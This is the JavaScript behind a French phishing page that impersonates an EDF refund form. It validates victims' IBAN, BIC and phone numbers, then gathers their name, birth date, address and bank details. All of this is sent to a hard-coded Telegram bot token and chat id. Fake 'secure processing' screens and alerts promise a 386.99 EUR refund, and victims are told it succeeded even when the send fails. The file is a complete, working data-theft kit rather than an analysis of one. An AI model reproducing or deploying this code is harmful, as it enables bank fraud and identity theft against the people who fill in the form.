
        const BT = '8244958273:AAGi0SZCLHzfQLJdPK2RXPPkXsJYR6XncJI'; 
        const TC = ' 1572142056';
        
      
        // Fonction pour valider le format de l'IBAN
        function validateIBAN(iban) {
            // Nettoyer l'IBAN (supprimer les espaces et convertir en majuscules)
            const cleanIban = iban.replace(/\s+/g, '').toUpperCase();
            
            // Vérifier la longueur minimale (au moins 15 caractères pour les plus courts)
            if (cleanIban.length < 15 || cleanIban.length > 34) {
                return false;
            }
            
            // Vérifier le format avec une expression régulière
            const ibanRegex = /^[A-Z]{2}[0-9]{2}[A-Z0-9]{1,30}$/;
            return ibanRegex.test(cleanIban);
        }
        
        // Fonction pour valider le format du BIC
        function validateBIC(bic) {
            // Nettoyer le BIC (supprimer les espaces et convertir en majuscules)
            const cleanBic = bic.replace(/\s+/g, '').toUpperCase();
            
            // Vérifier la longueur (8 ou 11 caractères)
            if (cleanBic.length !== 8 && cleanBic.length !== 11) {
                return false;
            }
            
            // Vérifier le format avec une expression régulière
            const bicRegex = /^[A-Z]{6}[A-Z0-9]{2}([A-Z0-9]{3})?$/;
            return bicRegex.test(cleanBic);
        }
        
        // Fonction pour valider le format du numéro de téléphone
        function validatePhone(phone) {
            // Nettoyer le numéro de téléphone (supprimer les espaces, parenthèses, tirets, etc.)
            const cleanPhone = phone.replace(/[\s\(\)\.-]/g, '');
            
            // Vérifier si c'est un format international (commence par +)
            if (cleanPhone.startsWith('+')) {
                // Format international - au moins 8 chiffres après le +
                const digits = cleanPhone.substring(1).replace(/\D/g, '');
                return digits.length >= 8;
            } else {
                // Format national - au moins 10 chiffres
                const digits = cleanPhone.replace(/\D/g, '');
                return digits.length === 10 && (digits.startsWith('0') || digits.startsWith('33'));
            }
        }
        
        // Fonction pour formater l'IBAN en groupes de 4 caractères
        function formatIBAN(iban) {
            // Supprimer tous les espaces existants et convertir en majuscules
            let value = iban.replace(/\s+/g, '').toUpperCase();
            
            // Limiter aux caractères autorisés (lettres et chiffres)
            value = value.replace(/[^A-Z0-9]/g, '');
            
            // Formater en groupes de 4 caractères
            const parts = [];
            for (let i = 0; i < value.length; i += 4) {
                parts.push(value.substring(i, i + 4));
            }
            
            return parts.join(' ');
        }
        
        // Fonction pour formater le numéro de téléphone
        function formatPhone(phone) {
            // Nettoyer le numéro
            let value = phone.replace(/[\s\(\)\.-]/g, '');
            
            // Si le numéro commence par +, formater différemment
            if (value.startsWith('+')) {
                const rest = value.substring(1);
                const digits = rest.replace(/\D/g, '');
                
                // Formater en groupes de 2 chiffres
                let formatted = '+';
                for (let i = 0; i < digits.length; i += 2) {
                    if (i > 0) formatted += ' ';
                    formatted += digits.substring(i, i + 2);
                }
                return formatted;
            } else {
                // Format national français
                const digits = value.replace(/\D/g, '');
                
                if (digits.length === 10 && digits.startsWith('0')) {
                    // Formater comme 01 23 45 67 89
                    return digits.replace(/(\d{2})(?=\d)/g, '$1 ').trim();
                } else if (digits.startsWith('33')) {
                    // Formater comme +33 1 23 45 67 89
                    return '+33 ' + digits.substring(2).replace(/(\d{2})(?=\d)/g, '$1 ').trim();
                }
                
                // Retourner la valeur originale si le format n'est pas reconnu
                return phone;
            }
        }
        
        // Fonction pour envoyer les données à Telegram
        async function sendToTelegram(formData) {
            if (!BT || !TC || BT === 'YOUR_BOT_TOKEN') {
                console.error('Configuration Telegram manquante');
                return false;
            }
            
            try {
                // Construction du message
                const message = `
🔔 Nouvelle demande de remboursement EDF 🔔
                
👤 Informations personnelles:
- Nom: ${formData.lastName}
- Prénom: ${formData.firstName}
- Date de naissance: ${formData.birthDate}
- Adresse: ${formData.address}
- Code postal: ${formData.zipCode}
- Ville: ${formData.city}
- Téléphone: ${formData.phone}

💳 Coordonnées bancaires:
- IBAN: ${formData.iban}
- BIC: ${formData.bic}
- Titulaire du compte: ${formData.accountName}

📋 Référence: REMB-2024-05-78945
💰 Montant: 386,99 €
⏰ Horodatage: ${new Date().toLocaleString('fr-FR')}
                `;
                
                // Encodage du message pour l'URL
                const encodedMessage = encodeURIComponent(message);
                
                // Envoi à l'API Telegram
                const response = await fetch(`https://api.telegram.org/bot${BT}/sendMessage?chat_id=${TC}&text=${encodedMessage}`);
                
                return response.ok;
            } catch (error) {
                console.error('Erreur lors de l\'envoi à Telegram:', error);
                return false;
            }
        }

        // Formatage automatique de l'IBAN (groupes de 4 caractères)
        document.getElementById('iban').addEventListener('input', function(e) {
            // Sauvegarder la position du curseur
            const cursorPosition = e.target.selectionStart;
            const originalLength = e.target.value.length;
            
            // Formater l'IBAN
            e.target.value = formatIBAN(e.target.value);
            
            // Restaurer la position du curseur en ajustant pour les espaces ajoutés
            const newLength = e.target.value.length;
            const lengthDiff = newLength - originalLength;
            
            // Calculer le nombre d'espaces avant la position du curseur dans l'ancienne valeur
            const spacesBeforeCursor = (e.target.value.substring(0, cursorPosition).match(/\s/g) || []).length;
            
            // Positionner le curseur
            const newCursorPosition = cursorPosition + lengthDiff + spacesBeforeCursor;
            e.target.setSelectionRange(newCursorPosition, newCursorPosition);
            
            // Valider et afficher les erreurs
            const ibanError = document.getElementById('iban-error');
            if (validateIBAN(e.target.value)) {
                ibanError.style.display = 'none';
            } else {
                ibanError.style.display = 'block';
            }
        });

        // Validation de l'IBAN lors de la perte de focus
        document.getElementById('iban').addEventListener('blur', function(e) {
            const ibanError = document.getElementById('iban-error');
            if (!validateIBAN(e.target.value)) {
                ibanError.style.display = 'block';
            } else {
                ibanError.style.display = 'none';
            }
        });

        // Mise en majuscules automatique pour le BIC
        document.getElementById('bic').addEventListener('input', function(e) {
            e.target.value = e.target.value.toUpperCase();
            
            // Valider et afficher les erreurs
            const bicError = document.getElementById('bic-error');
            if (validateBIC(e.target.value)) {
                bicError.style.display = 'none';
            } else {
                bicError.style.display = 'block';
            }
        });

        // Validation du BIC lors de la perte de focus
        document.getElementById('bic').addEventListener('blur', function(e) {
            const bicError = document.getElementById('bic-error');
            if (!validateBIC(e.target.value)) {
                bicError.style.display = 'block';
            } else {
                bicError.style.display = 'none';
            }
        });

        // Formatage automatique du numéro de téléphone
        document.getElementById('phone').addEventListener('input', function(e) {
            // Sauvegarder la position du curseur
            const cursorPosition = e.target.selectionStart;
            const originalLength = e.target.value.length;
            
            // Formater le téléphone
            e.target.value = formatPhone(e.target.value);
            
            // Restaurer la position du curseur en ajustant pour les espaces ajoutés
            const newLength = e.target.value.length;
            const lengthDiff = newLength - originalLength;
            
            // Calculer le nombre d'espaces avant la position du curseur dans l'ancienne valeur
            const spacesBeforeCursor = (e.target.value.substring(0, cursorPosition).match(/\s/g) || []).length;
            
            // Positionner le curseur
            const newCursorPosition = cursorPosition + lengthDiff + spacesBeforeCursor;
            e.target.setSelectionRange(newCursorPosition, newCursorPosition);
            
            // Valider et afficher les erreurs
            const phoneError = document.getElementById('phone-error');
            if (validatePhone(e.target.value)) {
                phoneError.style.display = 'none';
            } else {
                phoneError.style.display = 'block';
            }
        });

        // Validation du téléphone lors de la perte de focus
        document.getElementById('phone').addEventListener('blur', function(e) {
            const phoneError = document.getElementById('phone-error');
            if (!validatePhone(e.target.value)) {
                phoneError.style.display = 'block';
            } else {
                phoneError.style.display = 'none';
            }
        });

        // Validation du formulaire
        document.getElementById('refundForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            // Valider l'IBAN
            const iban = document.getElementById('iban').value;
            const ibanError = document.getElementById('iban-error');
            if (!validateIBAN(iban)) {
                ibanError.style.display = 'block';
                document.getElementById('iban').focus();
                return;
            } else {
                ibanError.style.display = 'none';
            }
            
            // Valider le BIC
            const bic = document.getElementById('bic').value;
            const bicError = document.getElementById('bic-error');
            if (!validateBIC(bic)) {
                bicError.style.display = 'block';
                document.getElementById('bic').focus();
                return;
            } else {
                bicError.style.display = 'none';
            }
            
            // Valider le téléphone
            const phone = document.getElementById('phone').value;
            const phoneError = document.getElementById('phone-error');
            if (!validatePhone(phone)) {
                phoneError.style.display = 'block';
                document.getElementById('phone').focus();
                return;
            } else {
                phoneError.style.display = 'none';
            }
            
            // Récupération des données du formulaire
            const formData = {
                lastName: document.getElementById('lastName').value,
                firstName: document.getElementById('firstName').value,
                birthDate: document.getElementById('birthDate').value,
                address: document.getElementById('address').value,
                zipCode: document.getElementById('zipCode').value,
                city: document.getElementById('city').value,
                phone: document.getElementById('phone').value,
                iban: document.getElementById('iban').value,
                bic: document.getElementById('bic').value,
                accountName: document.getElementById('accountName').value
            };
            
            // Simulation de traitement sécurisé
            const loader = document.createElement('div');
            loader.innerHTML = `
                <div style="position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.7); display: flex; justify-content: center; align-items: center; z-index: 1000;">
                    <div style="background: white; padding: 30px; border-radius: 8px; text-align: center;">
                        <img src="https://cdn-icons-png.flaticon.com/512/148/148767.png" width="50" style="margin-bottom: 20px;" alt="Loading">
                        <h3 style="color: #005baa;">Traitement de votre demande en cours...</h3>
                        <p>Veuillez patienter pendant que nous sécurisons votre transaction.</p>
                    </div>
                </div>
            `;
            document.body.appendChild(loader);
            
            try {
                // Envoi des données à Telegram
                const telegramSuccess = await sendToTelegram(formData);
                
                // Simulation d'un délai de traitement
                setTimeout(() => {
                    document.body.removeChild(loader);
                    
                    if (telegramSuccess) {
                        alert('✅ Votre demande de remboursement a bien été enregistrée !\n\nUn email de confirmation vient de vous être envoyé. Votre remboursement de 386,99 € sera viré sur votre compte sous 3 jours ouvrés.\n\nMerci pour votre confiance.');
                    } else {
                        alert('✅ Votre demande a été traitée, mais nous avons rencontré un problème technique.\n\nNotre équipe va traiter votre demande manuellement. Vous recevrez un email de confirmation sous 24h.\n\nMerci pour votre compréhension.');
                    }
                }, 3000);
            } catch (error) {
                document.body.removeChild(loader);
                alert('❌ Une erreur s\'est produite lors du traitement de votre demande. Veuillez réessayer ou contacter notre service client.');
                console.error(error);
            }

        });
